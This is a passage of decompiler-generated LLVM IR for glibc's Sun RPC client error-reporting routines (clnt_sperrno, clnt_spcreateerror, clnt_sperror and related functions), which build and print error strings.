  uselistorder i32 20, { 135, 136, 123, 124, 125, 62, 12, 126, 16, 139, 61, 149, 137, 150, 151, 129, 23, 130, 44, 45, 46, 47, 48, 49, 50, 51, 52, 138, 63, 64, 65, 66, 67, 68, 69, 8, 53, 70, 71, 72, 73, 74, 127, 128, 20, 140, 141, 88, 89, 75, 76, 79, 13, 30, 103, 104, 77, 132, 78, 152, 55, 54, 56, 57, 102, 142, 143, 144, 2, 145, 3, 146, 24, 147, 148, 153, 131, 4, 90, 91, 92, 93, 85, 133, 80, 81, 82, 83, 84, 134, 155, 154, 31, 32, 33, 34, 35, 36, 37, 41, 38, 39, 40, 0, 42, 43, 9, 86, 58, 59, 60, 87, 11, 10, 94, 95, 96, 97, 98, 99, 100, 101, 25, 105, 5, 26, 106, 107, 108, 109, 21, 110, 111, 14, 22, 112, 113, 15, 114, 1, 6, 27, 115, 116, 117, 7, 28, 118, 119, 120, 121, 29, 122, 17, 18, 19 }
  uselistorder i16 0, { 44, 0, 11, 45, 19, 1, 18, 46, 16, 47, 48, 8, 9, 12, 2, 13, 3, 14, 10, 20, 21, 22, 23, 24, 30, 25, 26, 27, 28, 29, 31, 32, 33, 34, 36, 37, 35, 38, 15, 39, 40, 41, 42, 43, 4, 5, 6, 7, 17 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8067204, { 1, 0 }
}

define i32 @__GI_clnt_sperrno(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  br label %dec_label_pc_8067288

dec_label_pc_8067288:                             ; preds = %entry, %dec_label_pc_806729e
  %v0_806729e8 = phi i32 [ 0, %entry ], [ %v1_806729e, %dec_label_pc_806729e ]
  %v1_8067288 = mul nuw nsw i32 %v0_806729e8, 8
  %v2_8067288 = add i32 %v1_8067288, ptrtoint (i32* @global_var_806ea40.912 to i32)
  %v3_8067288 = inttoptr i32 %v2_8067288 to i32*
  %v4_8067288 = load i32, i32* %v3_8067288, align 8
  %v16_8067288 = icmp eq i32 %v4_8067288, %arg1
  %v1_806728f = icmp eq i1 %v16_8067288, false
  br i1 %v1_806728f, label %dec_label_pc_806729e, label %dec_label_pc_8067291

dec_label_pc_8067291:                             ; preds = %dec_label_pc_8067288
  %v2_8067291 = add i32 %v1_8067288, ptrtoint (i32* @global_var_806ea44.913 to i32)
  %v3_8067291 = inttoptr i32 %v2_8067291 to i32*
  %v4_8067291 = load i32, i32* %v3_8067291, align 4
  %v1_8067298 = add i32 %v4_8067291, ptrtoint ([13 x i8]* @global_var_806eae0.914 to i32)
  ret i32 %v1_8067298

dec_label_pc_806729e:                             ; preds = %dec_label_pc_8067288
  %v1_806729e = add nuw nsw i32 %v0_806729e8, 1
  %tmp11 = icmp ult i32 %v1_806729e, 18
  br i1 %tmp11, label %dec_label_pc_8067288, label %dec_label_pc_80672a4

dec_label_pc_80672a4:                             ; preds = %dec_label_pc_806729e
  ret i32 ptrtoint ([26 x i8]* @global_var_806e83b.915 to i32)

; uselistorder directives
  uselistorder i32 %v0_806729e8, { 1, 0 }
  uselistorder i32 18, { 0, 2, 3, 4, 1, 5, 6 }
  uselistorder label %dec_label_pc_8067288, { 1, 0 }
}

define i32 @free_mem() local_unnamed_addr {
entry:
  %v1_80672ad = call i32 @__rpc_thread_variables(i32 ptrtoint (i32* @0 to i32))
  %v1_80672b5 = add i32 %v1_80672ad, 156
  %v2_80672b5 = inttoptr i32 %v1_80672b5 to i32*
  %v3_80672b5 = load i32, i32* %v2_80672b5, align 4
  %v1_80672bb = call i32 @free(i32 %v3_80672b5)
  ret i32 %v1_80672bb

; uselistorder directives
  uselistorder i32 (i32)* @free, { 67, 62, 69, 15, 14, 13, 12, 0, 35, 34, 33, 32, 31, 30, 29, 68, 65, 64, 63, 18, 61, 11, 70, 66, 17, 16, 10, 8, 7, 6, 5, 4, 3, 2, 9, 60, 59, 58, 57, 56, 55, 54, 53, 28, 27, 26, 25, 24, 41, 23, 22, 45, 44, 46, 21, 38, 37, 36, 40, 39, 20, 1, 52, 51, 50, 49, 48, 47, 43, 42, 19 }
  uselistorder i32* @0, { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 1, 4, 5, 6, 2, 3, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 24, 23, 22, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 48, 49, 50, 51, 52, 53, 54, 55, 56, 46, 47, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 106, 107, 101, 102, 103, 104, 105, 100, 110, 111, 108, 109, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153 }
}

define i32 @clnt_perrno(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80672c8 = load i8*, i8** @global_var_8073d70, align 4
  %v1_80672c8 = ptrtoint i8* %v0_80672c8 to i32
  store i32 %v1_80672c8, i32* @ebx, align 4
  %v1_80672d2 = call i32 @__GI_clnt_sperrno(i32 %arg1)
  %v0_80672d8 = load i32, i32* @ebx, align 4
  %v3_80672da = call i32 @__GI_fputs(i32 %v1_80672d2, i32 %v0_80672d8)
  ret i32 %v3_80672da
}

define i32 @_buf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80672e4 = load i32, i32* @ebx, align 4
  store i32 %v0_80672e4, i32* %stack_var_-4, align 4
  %v1_80672e8 = call i32 @__rpc_thread_variables(i32 %v0_80672e4)
  store i32 %v1_80672e8, i32* @ebx, align 4
  %v1_80672ef = add i32 %v1_80672e8, 156
  %v2_80672ef = inttoptr i32 %v1_80672ef to i32*
  %v3_80672ef = load i32, i32* %v2_80672ef, align 4
  %v4_80672ef = icmp eq i32 %v3_80672ef, 0
  %v1_80672f6 = icmp eq i1 %v4_80672ef, false
  br i1 %v1_80672f6, label %dec_label_pc_806730e, label %dec_label_pc_80672f8

dec_label_pc_80672f8:                             ; preds = %entry
  %v1_8067300 = call i32 @malloc(i32 256)
  %v1_8067308 = load i32, i32* @ebx, align 4
  %v2_8067308 = add i32 %v1_8067308, 156
  %v3_8067308 = inttoptr i32 %v2_8067308 to i32*
  store i32 %v1_8067300, i32* %v3_8067308, align 4
  %v0_806730e.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_806730e

dec_label_pc_806730e:                             ; preds = %entry, %dec_label_pc_80672f8
  %v0_806730e = phi i32 [ %v1_80672e8, %entry ], [ %v0_806730e.pre, %dec_label_pc_80672f8 ]
  %v1_806730e = add i32 %v0_806730e, 156
  %v2_806730e = inttoptr i32 %v1_806730e to i32*
  %v3_806730e = load i32, i32* %v2_806730e, align 4
  %v2_8067314 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8067314, i32* @ecx, align 4
  %v2_8067316 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8067316, i32* @ebx, align 4
  ret i32 %v3_806730e

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 37, 40, 5, 4, 3, 14, 13, 42, 41, 8, 39, 38, 36, 7, 6, 35, 1, 2, 43, 0, 12, 11, 29, 30, 16, 19, 34, 33, 32, 31, 15, 28, 27, 26, 25, 24, 23, 22, 21, 20, 18, 17, 10, 9 }
  uselistorder i32 256, { 72, 1, 2, 3, 4, 61, 5, 6, 7, 8, 9, 10, 11, 12, 60, 13, 14, 15, 75, 76, 73, 16, 17, 20, 18, 19, 21, 22, 23, 54, 55, 24, 56, 62, 25, 26, 77, 27, 28, 0, 57, 58, 66, 67, 59, 29, 30, 31, 32, 33, 34, 68, 69, 35, 36, 37, 38, 81, 39, 40, 41, 42, 43, 44, 45, 46, 63, 78, 47, 70, 48, 49, 53, 50, 51, 71, 64, 79, 74, 80, 65, 52 }
  uselistorder i32 156, { 2, 3, 4, 1, 0, 5, 6 }
  uselistorder i32 (i32)* @__rpc_thread_variables, { 12, 17, 5, 16, 15, 14, 13, 11, 1, 3, 10, 2, 9, 0, 8, 4, 7, 6 }
  uselistorder label %dec_label_pc_806730e, { 1, 0 }
}

define i32 @clnt_spcreateerror(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-1040 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8067318 = load i32, i32* @ebp, align 4
  %v0_8067319 = load i32, i32* @edi, align 4
  %v0_806731a = load i32, i32* @esi, align 4
  %v0_806731b = load i32, i32* @ebx, align 4
  store i32 %v0_806731b, i32* %stack_var_-16, align 4
  %v3_8067322 = call i32 @_buf(i32 %v0_806731b, i32 %v0_806731a, i32 %v0_8067319)
  store i32 %v3_8067322, i32* @ebp, align 4
  %v1_8067329 = icmp eq i32 %v3_8067322, 0
  br i1 %v1_8067329, label %dec_label_pc_80673fd, label %dec_label_pc_8067331

dec_label_pc_8067331:                             ; preds = %entry
  %v0_8067331 = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_8067331, i32* @edi, align 4
  %v3_8067346 = call i32 @sprintf(i32 ptrtoint ([5 x i8]* @global_var_806e855.916 to i32), i32 %arg1)
  %v0_806734b = load i32, i32* @edi, align 4
  %v1_806734b = inttoptr i32 %v0_806734b to i32*
  %v2_806734b = load i32, i32* %v1_806734b, align 4
  %v0_806734d = load i32, i32* @ebp, align 4
  %v2_806734d = add i32 %v0_806734d, %v3_8067346
  store i32 %v2_806734d, i32* %ebx.global-to-local, align 4
  %v1_8067351 = call i32 @__GI_clnt_sperrno(i32 %v2_806734b)
  store i32 %v1_8067351, i32* @eax, align 4
  %v5_806735a = inttoptr i32 %v2_806734d to i8*
  %v5_806735b = call i32 @strcpy(i8* %v5_806735a, i32 %v1_8067351)
  %v4_8067360 = inttoptr i32 %v2_806734d to i8*
  %v3_8067363 = call i32 @strlen(i8* %v4_8067360)
  %v2_806736b = add i32 %v2_806734d, %v3_8067363
  store i32 %v2_806736b, i32* %ebx.global-to-local, align 4
  %v0_806736d = load i32, i32* @edi, align 4
  %v1_806736d = inttoptr i32 %v0_806736d to i32*
  %v2_806736d = load i32, i32* %v1_806736d, align 4
  store i32 %v2_806736d, i32* @eax, align 4
  %v9_806736f = icmp eq i32 %v2_806736d, 12
  br i1 %v9_806736f, label %dec_label_pc_80673b2, label %dec_label_pc_8067374

dec_label_pc_8067374:                             ; preds = %dec_label_pc_8067331
  %v9_8067374 = icmp eq i32 %v2_806736d, 14
  %v1_8067377 = icmp eq i1 %v9_8067374, false
  br i1 %v1_8067377, label %dec_label_pc_80673f6, label %dec_label_pc_8067379

dec_label_pc_8067379:                             ; preds = %dec_label_pc_8067374
  %v5_8067380 = inttoptr i32 %v2_806736b to i8*
  %v5_8067381 = call i32 @strcpy(i8* %v5_8067380, i32 ptrtoint ([4 x i8]* @global_var_806e85a.917 to i32))
  %v0_8067386 = load i32, i32* %ebx.global-to-local, align 4
  %v4_8067386 = inttoptr i32 %v0_8067386 to i8*
  %v3_8067389 = call i32 @strlen(i8* %v4_8067386)
  %v0_8067391 = load i32, i32* @edi, align 4
  %v1_8067391 = add i32 %v0_8067391, 4
  %v2_8067391 = inttoptr i32 %v1_8067391 to i32*
  %v3_8067391 = load i32, i32* %v2_8067391, align 4
  %v0_8067394 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8067394 = add i32 %v0_8067394, %v3_8067389
  store i32 %v3_8067394, i32* %ebx.global-to-local, align 4
  %v1_8067396 = call i32 @__GI_clnt_sperrno(i32 %v3_8067391)
  store i32 %v1_8067396, i32* @eax, align 4
  %v5_806739d = inttoptr i32 %v3_8067394 to i8*
  %v5_806739e = call i32 @strcpy(i8* %v5_806739d, i32 %v1_8067396)
  %v4_80673a3 = inttoptr i32 %v3_8067394 to i8*
  %v3_80673a6 = call i32 @strlen(i8* %v4_80673a3)
  %v3_80673ae = add i32 %v3_8067394, %v3_80673a6
  store i32 %v3_80673ae, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80673f6

dec_label_pc_80673b2:                             ; preds = %dec_label_pc_8067331
  %v5_80673b9 = inttoptr i32 %v2_806736b to i8*
  %v5_80673ba = call i32 @strcpy(i8* %v5_80673b9, i32 ptrtoint ([4 x i8]* @global_var_806e85a.917 to i32))
  %v0_80673bf = load i32, i32* %ebx.global-to-local, align 4
  %v4_80673bf = inttoptr i32 %v0_80673bf to i8*
  %v3_80673c2 = call i32 @strlen(i8* %v4_80673bf)
  %v2_80673cf = add i32 %v0_80673bf, %v3_80673c2
  store i32 %v2_80673cf, i32* @esi, align 4
  %v2_80673d2 = ptrtoint i32* %stack_var_-1040 to i32
  store i32 %v2_80673d2, i32* @ebx, align 4
  %v0_80673d7 = load i32, i32* @edi, align 4
  %v1_80673d7 = add i32 %v0_80673d7, 8
  %v2_80673d7 = inttoptr i32 %v1_80673d7 to i32*
  %v3_80673d7 = load i32, i32* %v2_80673d7, align 4
  %v5_80673da = call i32 @__GI___glibc_strerror_r(i32 %v3_80673d7, i32 %v2_80673d2, i32 1024)
  %v3_80673e0 = ptrtoint i32* %stack_var_-1040 to i32
  store i32 %v3_80673e0, i32* @eax, align 4
  %v0_80673e2 = load i32, i32* @esi, align 4
  %v5_80673e2 = inttoptr i32 %v0_80673e2 to i8*
  %v5_80673e3 = call i32 @strcpy(i8* %v5_80673e2, i32 %v2_80673d2)
  %v0_80673e8 = load i32, i32* @esi, align 4
  %v4_80673e8 = inttoptr i32 %v0_80673e8 to i8*
  %v3_80673eb = call i32 @strlen(i8* %v4_80673e8)
  %v0_80673f3 = load i32, i32* @esi, align 4
  %v2_80673f3 = add i32 %v0_80673f3, %v3_80673eb
  store i32 %v2_80673f3, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80673f6

dec_label_pc_80673f6:                             ; preds = %dec_label_pc_8067374, %dec_label_pc_8067379, %dec_label_pc_80673b2
  %v0_80673f6 = phi i32 [ %v2_806736b, %dec_label_pc_8067374 ], [ %v3_80673ae, %dec_label_pc_8067379 ], [ %v2_80673f3, %dec_label_pc_80673b2 ]
  %v1_80673f6 = inttoptr i32 %v0_80673f6 to i8*
  store i8 10, i8* %v1_80673f6, align 1
  %v0_80673f9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80673f9 = add i32 %v0_80673f9, 1
  %v2_80673f9 = inttoptr i32 %v1_80673f9 to i8*
  store i8 0, i8* %v2_80673f9, align 1
  %v0_8067403.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_80673fd

dec_label_pc_80673fd:                             ; preds = %entry, %dec_label_pc_80673f6
  %v0_8067403 = phi i32 [ 0, %entry ], [ %v0_8067403.pre, %dec_label_pc_80673f6 ]
  %v2_8067405 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8067405, i32* @ebx, align 4
  store i32 %v0_806731a, i32* @esi, align 4
  store i32 %v0_8067319, i32* @edi, align 4
  store i32 %v0_8067318, i32* @ebp, align 4
  ret i32 %v0_8067403

; uselistorder directives
  uselistorder i32 %v2_80673d2, { 1, 0, 2 }
  uselistorder i32 %v3_8067394, { 1, 0, 2, 3 }
  uselistorder i32 %v2_806734d, { 1, 0, 2, 3 }
  uselistorder i32* %ebx.global-to-local, { 3, 0, 4, 1, 2, 5, 6, 7, 8 }
  uselistorder i32 ()* @__GI___rpc_thread_createerr, { 4, 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_80673fd, { 1, 0 }
  uselistorder label %dec_label_pc_80673f6, { 2, 1, 0 }
}

define i32 @clnt_pcreateerror(i32 %arg1) local_unnamed_addr {
entry:
  %tmp5 = call i8* @__decompiler_undefined_function_3()
  %v0_806740e = load i8*, i8** @global_var_8073d70, align 4
  %v1_806740e = ptrtoint i8* %v0_806740e to i32
  store i32 %v1_806740e, i32* @ebx, align 4
  %v1_8067418 = call i32 @clnt_spcreateerror(i32 %arg1)
  store i32 %arg1, i32* @edx, align 4
  %v3_806741e = ptrtoint i8* %tmp5 to i32
  store i32 %v3_806741e, i32* @ecx, align 4
  %v0_806741f = load i32, i32* @ebx, align 4
  %v3_8067421 = call i32 @__GI_fputs(i32 %v1_8067418, i32 %v0_806741f)
  ret i32 %v3_8067421
}

define i32 @__GI_clnt_sperror(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1056 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_806742c = load i32, i32* @edi, align 4
  %v0_806742d = load i32, i32* @esi, align 4
  %v0_806742e = load i32, i32* @ebx, align 4
  store i32 %v0_806742e, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_806743c = call i32 @_buf(i32 %v0_806742e, i32 %v0_806742d, i32 %v0_806742c)
  store i32 %v3_806743c, i32* @ebp, align 4
  %v2_8067445 = icmp eq i32 %v3_806743c, 0
  br i1 %v2_8067445, label %dec_label_pc_8067593, label %dec_label_pc_806744d

dec_label_pc_806744d:                             ; preds = %entry
  %v0_806744f = load i32, i32* @ebx, align 4
  %v1_806744f = add i32 %v0_806744f, 4
  %v2_806744f = inttoptr i32 %v1_806744f to i32*
  %v3_806744f = load i32, i32* %v2_806744f, align 4
  %v7_806745b = add i32 %v3_806744f, 8
  %v8_806745b = inttoptr i32 %v7_806745b to i32*
  %v9_806745b = load i32, i32* %v8_806745b, align 4
  call void @__pseudo_call(i32 %v9_806745b)
  %v3_806746e = call i32 @sprintf(i32 ptrtoint ([5 x i8]* @global_var_806e855.916 to i32), i32 %arg1)
  %v3_806747a = add i32 %v3_806746e, %v3_806743c
  store i32 %v3_806747a, i32* @ebx, align 4
  %v1_806747e = call i32 @__GI_clnt_sperrno(i32 %tmp18)
  store i32 %v1_806747e, i32* @eax, align 4
  %v0_8067487 = load i32, i32* @ebx, align 4
  %v5_8067487 = inttoptr i32 %v0_8067487 to i8*
  %v5_8067488 = call i32 @strcpy(i8* %v5_8067487, i32 %v1_806747e)
  %v0_806748d = load i32, i32* @ebx, align 4
  %v4_806748d = inttoptr i32 %v0_806748d to i8*
  %v3_8067490 = call i32 @strlen(i8* %v4_806748d)
  %v0_80674a0 = load i32, i32* @ebx, align 4
  %v2_80674a0 = add i32 %v0_80674a0, %v3_8067490
  store i32 %v2_80674a0, i32* @esi, align 4
  switch i32 %tmp18, label %dec_label_pc_806756c [
    i32 0, label %dec_label_pc_806758a
    i32 1, label %dec_label_pc_806758a
    i32 2, label %dec_label_pc_806758a
    i32 3, label %dec_label_pc_80674b7
    i32 4, label %dec_label_pc_80674b7
    i32 5, label %dec_label_pc_806758a
    i32 6, label %dec_label_pc_8067557
    i32 7, label %dec_label_pc_80674eb
    i32 8, label %dec_label_pc_806758a
    i32 9, label %dec_label_pc_8067557
    i32 10, label %dec_label_pc_806758a
    i32 11, label %dec_label_pc_806758a
    i32 12, label %dec_label_pc_806758a
    i32 13, label %dec_label_pc_806758a
    i32 14, label %dec_label_pc_806758a
    i32 15, label %dec_label_pc_806758a
    i32 16, label %dec_label_pc_806758a
    i32 17, label %dec_label_pc_806758a
  ]

dec_label_pc_80674b7:                             ; preds = %dec_label_pc_806744d, %dec_label_pc_806744d
  %v2_80674bd = ptrtoint i32* %stack_var_-1056 to i32
  store i32 %v2_80674bd, i32* @ebx, align 4
  %v3_80674c2 = load i32, i32* %stack_var_-28, align 4
  %v5_80674c9 = call i32 @__GI___glibc_strerror_r(i32 %v3_80674c2, i32 %v2_80674bd, i32 1024)
  %v0_806757f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_806757f

dec_label_pc_80674dc:                             ; preds = %dec_label_pc_80674f6
  %v2_80674dc = add i32 %v1_80674f6, ptrtoint (i32* @global_var_806e924.920 to i32)
  %v3_80674dc = inttoptr i32 %v2_80674dc to i32*
  %v4_80674dc = load i32, i32* %v3_80674dc, align 4
  %v1_80674e3 = add i32 %v4_80674dc, ptrtoint ([18 x i8]* @global_var_806e960.921 to i32)
  br label %dec_label_pc_8067507

dec_label_pc_80674eb:                             ; preds = %dec_label_pc_806744d
  %v3_80674eb = load i32, i32* %stack_var_-28, align 4
  store i32 0, i32* @eax, align 4
  br label %dec_label_pc_80674f6

dec_label_pc_80674f6:                             ; preds = %dec_label_pc_80674eb, %dec_label_pc_80674ff
  %v0_806750739 = phi i32 [ 0, %dec_label_pc_80674eb ], [ %v1_80674ff, %dec_label_pc_80674ff ]
  %v1_80674f6 = mul nuw nsw i32 %v0_806750739, 8
  %v2_80674f6 = add i32 %v1_80674f6, ptrtoint (i32* @global_var_806e920.922 to i32)
  %v3_80674f6 = inttoptr i32 %v2_80674f6 to i32*
  %v4_80674f6 = load i32, i32* %v3_80674f6, align 8
  %v16_80674f6 = icmp eq i32 %v4_80674f6, %v3_80674eb
  br i1 %v16_80674f6, label %dec_label_pc_80674dc, label %dec_label_pc_80674ff

dec_label_pc_80674ff:                             ; preds = %dec_label_pc_80674f6
  %v1_80674ff = add nuw nsw i32 %v0_806750739, 1
  store i32 %v1_80674ff, i32* @eax, align 4
  %tmp = icmp ult i32 %v1_80674ff, 8
  br i1 %tmp, label %dec_label_pc_80674f6, label %dec_label_pc_8067505

dec_label_pc_8067505:                             ; preds = %dec_label_pc_80674ff
  br label %dec_label_pc_8067507

dec_label_pc_8067507:                             ; preds = %dec_label_pc_80674dc, %dec_label_pc_8067505
  %storemerge5 = phi i32 [ 0, %dec_label_pc_8067505 ], [ %v1_80674e3, %dec_label_pc_80674dc ]
  store i32 %storemerge5, i32* @edi, align 4
  %v5_806750e = inttoptr i32 %v2_80674a0 to i8*
  %v5_806750f = call i32 @strcpy(i8* %v5_806750e, i32 ptrtoint ([9 x i8]* @global_var_806e893.923 to i32))
  %v0_8067514 = load i32, i32* @esi, align 4
  %v4_8067514 = inttoptr i32 %v0_8067514 to i8*
  %v3_8067517 = call i32 @strlen(i8* %v4_8067514)
  store i32 %v3_8067517, i32* @eax, align 4
  %v0_806751f = load i32, i32* @edi, align 4
  %v1_806751f = icmp eq i32 %v0_806751f, 0
  %v0_8067521 = load i32, i32* @esi, align 4
  %v2_8067521 = add i32 %v0_8067521, %v3_8067517
  store i32 %v2_8067521, i32* @ebx, align 4
  br i1 %v1_806751f, label %dec_label_pc_806753f, label %dec_label_pc_8067526

dec_label_pc_8067526:                             ; preds = %dec_label_pc_8067507
  %v5_8067529 = inttoptr i32 %v2_8067521 to i8*
  %v5_806752a = call i32 @strcpy(i8* %v5_8067529, i32 %v0_806751f)
  %v0_806752f = load i32, i32* @ebx, align 4
  %v4_806752f = inttoptr i32 %v0_806752f to i8*
  %v3_8067532 = call i32 @strlen(i8* %v4_806752f)
  %v0_806753a = load i32, i32* @ebx, align 4
  %v2_806753a = add i32 %v0_806753a, %v3_8067532
  store i32 %v2_806753a, i32* @esi, align 4
  br label %dec_label_pc_806758a

dec_label_pc_806753f:                             ; preds = %dec_label_pc_8067507
  %v4_806754d = call i32 @sprintf(i32 %v2_8067521, i32 ptrtoint ([36 x i8]* @global_var_806e89c.924 to i32))
  %v0_8067552 = load i32, i32* @ebx, align 4
  %v2_8067552 = add i32 %v0_8067552, %v4_806754d
  br label %dec_label_pc_8067587

dec_label_pc_8067557:                             ; preds = %dec_label_pc_806744d, %dec_label_pc_806744d
  br label %dec_label_pc_806757f

dec_label_pc_806756c:                             ; preds = %dec_label_pc_806744d
  br label %dec_label_pc_806757f

dec_label_pc_806757f:                             ; preds = %dec_label_pc_8067557, %dec_label_pc_80674b7, %dec_label_pc_806756c
  %v0_806757f = phi i32 [ %v2_80674a0, %dec_label_pc_8067557 ], [ %v0_806757f.pre, %dec_label_pc_80674b7 ], [ %v2_80674a0, %dec_label_pc_806756c ]
  %v2_8067580 = phi i8* [ getelementptr inbounds ([40 x i8], [40 x i8]* @global_var_806e86b.925, i32 0, i32 0), %dec_label_pc_8067557 ], [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_806e85e.919, i32 0, i32 0), %dec_label_pc_80674b7 ], [ getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_806e8c0.926, i32 0, i32 0), %dec_label_pc_806756c ]
  %v3_8067580 = ptrtoint i8* %v2_8067580 to i32
  %v4_8067580 = call i32 @sprintf(i32 %v0_806757f, i32 %v3_8067580)
  %v0_8067585 = load i32, i32* @esi, align 4
  %v3_8067585 = add i32 %v0_8067585, %v4_8067580
  br label %dec_label_pc_8067587

dec_label_pc_8067587:                             ; preds = %dec_label_pc_806753f, %dec_label_pc_806757f
  %storemerge = phi i32 [ %v3_8067585, %dec_label_pc_806757f ], [ %v2_8067552, %dec_label_pc_806753f ]
  store i32 %storemerge, i32* @esi, align 4
  br label %dec_label_pc_806758a

dec_label_pc_806758a:                             ; preds = %dec_label_pc_806744d, %dec_label_pc_806744d, %dec_label_pc_806744d, %dec_label_pc_806744d, %dec_label_pc_806744d, %dec_label_pc_806744d, %dec_label_pc_806744d, %dec_label_pc_806744d, %dec_label_pc_806744d, %dec_label_pc_806744d, %dec_label_pc_806744d, %dec_label_pc_806744d, %dec_label_pc_806744d, %dec_label_pc_8067526, %dec_label_pc_8067587
  %v0_806758a = phi i32 [ %v2_80674a0, %dec_label_pc_806744d ], [ %v2_80674a0, %dec_label_pc_806744d ], [ %v2_80674a0, %dec_label_pc_806744d ], [ %v2_80674a0, %dec_label_pc_806744d ], [ %v2_80674a0, %dec_label_pc_806744d ], [ %v2_80674a0, %dec_label_pc_806744d ], [ %v2_80674a0, %dec_label_pc_806744d ], [ %v2_80674a0, %dec_label_pc_806744d ], [ %v2_80674a0, %dec_label_pc_806744d ], [ %v2_80674a0, %dec_label_pc_806744d ], [ %v2_80674a0, %dec_label_pc_806744d ], [ %v2_80674a0, %dec_label_pc_806744d ], [ %v2_80674a0, %dec_label_pc_806744d ], [ %v2_806753a, %dec_label_pc_8067526 ], [ %storemerge, %dec_label_pc_8067587 ]
  %v1_806758a = inttoptr i32 %v0_806758a to i8*
  store i8 10, i8* %v1_806758a, align 1
  %v0_806758d = load i32, i32* @esi, align 4
  %v1_806758d = add i32 %v0_806758d, 1
  %v2_806758d = inttoptr i32 %v1_806758d to i8*
  store i8 0, i8* %v2_806758d, align 1
  br label %dec_label_pc_8067593

dec_label_pc_8067593:                             ; preds = %entry, %dec_label_pc_806758a
  %v0_806759d = phi i32 [ 0, %entry ], [ %v3_806743c, %dec_label_pc_806758a ]
  %v2_806759a = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_806759a, i32* @esi, align 4
  store i32 %v0_806742d, i32* @edi, align 4
  store i32 %v0_806742c, i32* @ebp, align 4
  ret i32 %v0_806759d

; uselistorder directives
  uselistorder i32 %v1_80674ff, { 1, 0, 2 }
  uselistorder i32 %v1_80674f6, { 1, 0 }
  uselistorder i32 %v0_806750739, { 1, 0 }
  uselistorder i32 %v3_806743c, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i8 10, { 20, 19, 0, 1, 2, 17, 3, 4, 5, 6, 7, 8, 18, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 (i32, i32, i32)* @__GI___glibc_strerror_r, { 2, 1, 0 }
  uselistorder i32 1024, { 12, 13, 14, 15, 64, 0, 66, 16, 65, 57, 44, 43, 67, 17, 10, 11, 1, 2, 3, 4, 5, 59, 9, 8, 6, 7, 54, 18, 19, 53, 20, 21, 52, 22, 23, 51, 24, 25, 50, 26, 27, 49, 28, 29, 48, 30, 31, 47, 32, 33, 46, 34, 35, 45, 36, 37, 38, 39, 55, 40, 60, 61, 62, 63, 41, 56, 58, 42 }
  uselistorder i32 17, { 16, 18, 0, 20, 5, 3, 17, 9, 15, 6, 7, 4, 10, 11, 12, 13, 14, 21, 8, 2, 1, 19 }
  uselistorder i32 16, { 142, 416, 417, 365, 364, 42, 366, 367, 202, 418, 80, 426, 81, 82, 83, 200, 419, 10, 11, 310, 311, 312, 313, 368, 427, 428, 195, 12, 13, 14, 420, 43, 451, 452, 453, 0, 44, 375, 376, 377, 378, 379, 380, 387, 381, 382, 383, 384, 385, 386, 388, 389, 390, 391, 392, 393, 394, 396, 397, 398, 196, 197, 198, 199, 84, 114, 169, 170, 421, 201, 120, 125, 139, 203, 204, 205, 422, 206, 207, 208, 209, 210, 423, 171, 53, 140, 28, 172, 173, 121, 174, 175, 122, 176, 177, 178, 179, 180, 181, 182, 424, 425, 85, 144, 145, 86, 211, 212, 213, 214, 215, 216, 454, 369, 370, 371, 372, 429, 430, 431, 432, 433, 434, 435, 436, 458, 87, 263, 264, 217, 218, 265, 266, 267, 268, 269, 270, 88, 143, 314, 89, 354, 123, 219, 414, 220, 466, 455, 456, 46, 45, 457, 1, 47, 126, 221, 222, 48, 223, 224, 115, 225, 226, 227, 49, 399, 400, 116, 90, 15, 395, 91, 183, 184, 185, 124, 186, 92, 189, 187, 188, 41, 193, 190, 191, 192, 40, 194, 93, 50, 477, 308, 309, 401, 402, 403, 404, 405, 406, 373, 374, 407, 408, 409, 410, 437, 438, 439, 440, 441, 442, 2, 443, 444, 445, 446, 447, 51, 448, 449, 127, 450, 459, 460, 461, 411, 16, 271, 272, 242, 228, 229, 473, 474, 475, 476, 230, 231, 232, 233, 462, 463, 464, 465, 470, 471, 472, 3, 234, 235, 415, 29, 30, 31, 